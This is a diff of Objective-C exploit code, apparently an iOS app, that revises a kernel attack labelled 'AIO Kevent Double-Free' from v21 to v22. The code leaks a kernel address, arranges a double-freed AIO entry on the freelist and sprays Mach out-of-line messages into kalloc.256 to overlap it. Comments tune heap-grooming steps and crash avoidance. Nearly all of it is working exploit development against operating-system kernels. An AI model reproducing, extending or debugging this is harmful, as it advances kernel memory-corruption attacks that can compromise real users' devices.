@@ -5733,7 +5733,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO Kevent Double-Free v21 =========="];
+    [self appendLog:@"\n========== AIO Kevent Double-Free v22 =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5863,33 +5863,36 @@ static void *e2_free_and_ool_racer(void *arg) {
             self.leakedKernelAddr = kev.ident;
             [self appendLog:[NSString stringWithFormat:@"  leaked kernel addr: 0x%llx", self.leakedKernelAddr]];
 
-            // v21: REVERSE cleanup — free rcbs[6..0] so Y's two copies
-            // (kevent64 free + aio_return(&rcbs[0])) end up adjacent on freelist.
-            for (int i = AIO_NRECLAIM - 1; i >= 0; i--) {
+            // v22: FORWARD cleanup — free rcbs[0] FIRST (the double-free),
+            // then rcbs[1..6]. Forward order prevents close(kq) from
+            // dereferencing a dangling knote after timeout-path frees.
+            for (int i = 0; i < AIO_NRECLAIM; i++) {
                 if (aio_error(&rcbs[i]) != EINVAL) aio_return(&rcbs[i]);
             }
             close(kq);
             break;  // SUCCESS
         } else {
             [self appendLog:[NSString stringWithFormat:@"  kevent64 timeout (nev=%d)", nev]];
-            for (int i = AIO_NRECLAIM - 1; i >= 0; i--) {
+            // v22: FORWARD cleanup on timeout too — avoids close(kq)
+            // UAF on the reclaim entry's knote.
+            for (int i = 0; i < AIO_NRECLAIM; i++) {
                 if (aio_error(&rcbs[i]) != EINVAL) aio_return(&rcbs[i]);
             }
             close(kq);
         }
     }
 
-    // v21: SKIP health check — don't insert 4 entries between Y's two copies.
+    // v22: SKIP health check — don't insert 4 entries between Y's two copies.
     // In v20 the health check alloc+free pushed Y's copies apart, preventing overlap.
     // AIO subsystem health was already confirmed working in v10-v20.
 
-    // ---- v21: 10x OOL spray (NO drain) + reverse-cleanup freelist ordering ----
-    // Reverse Phase A cleanup places Y's two copies adjacent on the freelist.
-    // No drain = no consumption of Y copies. No health check = no extra entries.
-    // E2 takes Y's first copy; 10 OOL sprays hit Y's second copy → overlap.
-    // aio_return reads live entry fields — SAFE, no kevent, no procp deref.
+    // ---- v22: 20x OOL spray (NO drain) + FORWARD cleanup ----
+    // Forward Phase A cleanup fixes the v21 crash (dangling knote in close(kq)).
+    // Y's two copies on freelist: [Y-second, rcbs[1..6], Y-first].
+    // E2 takes Y-second; 20 OOL sprays sweep through rcbs[1..6] → hit Y-first.
+    // aio_error ONLY (no aio_return) to avoid procp crash on overlapped entry.
 
-    [self appendLog:@"\n--- Phase D v21: 10x OOL spray (no drain) ---"];
+    [self appendLog:@"\n--- Phase D v22: 20x OOL spray (no drain) ---"];
 
     // OOL payload: byte-offset pattern for field mapping
     enum { kDrainOolSize = 256 };
@@ -5904,8 +5907,8 @@ static void *e2_free_and_ool_racer(void *arg) {
         mach_msg_ool_descriptor_t ool;
     } DrainMsg;
 
-    // Create 10 OOL spray ports (no drain — all used for overlap spray after E2)
-    enum { kOolPorts = 10 };
+    // Create 20 OOL spray ports (no drain — all used for overlap spray after E2)
+    enum { kOolPorts = 20 };
     mach_port_t oolRecv[kOolPorts];
     mach_port_t oolSend[kOolPorts];
     int oolPortsReady = 0;
@@ -5925,11 +5928,12 @@ static void *e2_free_and_ool_racer(void *arg) {
     }
     [self appendLog:[NSString stringWithFormat:@"  OOL spray ports: %d/%d ready", oolPortsReady, kOolPorts]];
 
-    // ---- v21: E2 with SIGEV_NONE + 10x OOL spray via double-free overlap ----
-    // E2 takes Y's first copy from freelist head. 10 OOL sprays sweep through
-    // the freelist — one must hit Y's second copy (same physical address).
-    // Reverse cleanup ensures Y's two copies are ~6 reclaim entries apart.
-    // aio_return reads LIVE entry fields → returnval=0x27..20 if overlapped.
+    // ---- v22: E2 with SIGEV_NONE + 20x OOL spray via double-free overlap ----
+    // Forward cleanup freelist: [Y-second, rcbs[1..6], Y-first].
+    // E2 takes Y-second from head. 20 OOL sprays sweep rcbs[1..6] → Y-first.
+    // OOL #7 hits Y-first (same physical address) → OVERLAP confirmed.
+    // Post-overlap: aio_error ONLY (reads errorval @+0x28) — never aio_return
+    // because aio_return does TAILQ_REMOVE(entry->procp) → crash if corrupted.
     {
         static struct aiocb e2;
         static char e2buf[256];
@@ -5944,12 +5948,11 @@ static void *e2_free_and_ool_racer(void *arg) {
         [self appendLog:[NSString stringWithFormat:@"  E2 aio_read(SIGEV_NONE): %@", e2ok ? @"OK" : @"FAIL"]];
         if (e2ok && drainPayload && oolPortsReady > 0) {
             while (aio_error(&e2) == EINPROGRESS) usleep(100);
-            [self appendLog:[NSString stringWithFormat:@"  E2 done, aio_error=%d", aio_error(&e2)]];
+            [self appendLog:[NSString stringWithFormat:@"  E2 done, pre-spray aio_error=%d", aio_error(&e2)]];
 
-            // Send 10x OOL spray — each to a different port, each kalloc.256.
-            // With reverse cleanup, Y's two copies are ~6 reclaim entries apart.
-            // E2 took Y-first-copy; 10 sprays sweep through the freelist
-            // and one must hit Y-second-copy (same physical address → OVERLAP).
+            // v22: 20 OOL sprays sweep through freelist. After forward cleanup,
+            // Y's two copies are 7 entries apart (rcbs[1..6] + Y-first).
+            // E2 took Y-second; sprays #1-6 consume rcbs[1..6]; spray #7 hits Y-first.
             int oolSent = 0;
             for (int p = 0; p < oolPortsReady; p++) {
                 DrainMsg ool;
@@ -5970,27 +5973,34 @@ static void *e2_free_and_ool_racer(void *arg) {
             }
             [self appendLog:[NSString stringWithFormat:@"  OOL spray: %d/%d sent", oolSent, oolPortsReady]];
 
-            // Read back via aio_error + aio_return
+            // v22: aio_error ONLY — reads errorval @+0x28 from entry.
+            // aio_error likely does NOT access procp (no TAILQ_REMOVE).
+            // If overlap succeeded, errorval = 0x2B2A2928 (byte-offset bytes @0x28-0x2B).
+            // If overlap missed, errorval = 0 (success) or original value.
+            // NEVER call aio_return — it does TAILQ_REMOVE(entry->procp) → crash.
             int err = aio_error(&e2);
-            ssize_t retv = aio_return(&e2);
-            [self appendLog:[NSString stringWithFormat:@"  aio_error=%d", err]];
-            [self appendLog:[NSString stringWithFormat:@"  aio_return=%lld (0x%llx)", (long long)retv, (unsigned long long)retv]];
+            [self appendLog:[NSString stringWithFormat:@"  post-spray aio_error=%d (0x%08x)", err, (unsigned)err]];
 
-            if (retv == (ssize_t)0x2726252423222120ULL) {
-                [self appendLog:@"  >> CONFIRMED: OOL overlap + aio_return read! <<"];
-                [self appendLog:@"  >> returnval @+0x20, errorval @+0x28 mapped <<"];
-            } else if (retv == 0xE2E2) {
-                [self appendLog:@"  >> aio_return=0xE2E2 (original nbytes) — overlap missed slot <<"];
-            } else if (retv > 0 && retv < 256) {
-                [self appendLog:[NSString stringWithFormat:@"  >> returnval=0x%llx — partial or shifted overlap <<", (unsigned long long)retv]];
+            if (err == 0x2B2A2928) {
+                [self appendLog:@"  >> CONFIRMED: OOL overlap detected via aio_error! <<"];
+                [self appendLog:@"  >> errorval @+0x28 in AIO entry mapped <<"];
+            } else if (err == 0) {
+                [self appendLog:@"  >> aio_error=0 — overlap missed, entry not corrupted <<"];
+            } else if (err == EINVAL) {
+                [self appendLog:@"  >> aio_error=EINVAL — entry lookup failed (TAILQ corruption?) <<"];
+            } else if (err > 0 && err < 256) {
+                [self appendLog:[NSString stringWithFormat:@"  >> aio_error=0x%x — partial/shifted overlap <<", (unsigned)err]];
             } else {
-                [self appendLog:[NSString stringWithFormat:@"  >> unexpected=0x%llx — check byte-offset alignment <<", (unsigned long long)retv]];
+                [self appendLog:[NSString stringWithFormat:@"  >> aio_error=0x%x (%d) — unexpected, investigate <<", (unsigned)err, err]];
             }
+
+            // v22: LEAK E2 entry (don't call aio_return) — avoids procp crash.
+            [self appendLog:@"  E2 entry intentionally leaked (aio_return skipped for safety)"];
         } else {
             [self appendLog:[NSString stringWithFormat:@"  E2 SKIP: e2ok=%d payload=%p ports=%d", e2ok, drainPayload, oolPortsReady]];
             if (e2ok) {
                 while (aio_error(&e2) == EINPROGRESS) usleep(100);
-                aio_return(&e2);
+                aio_return(&e2);  // safe here — no overlap, valid entry
             }
         }
     }
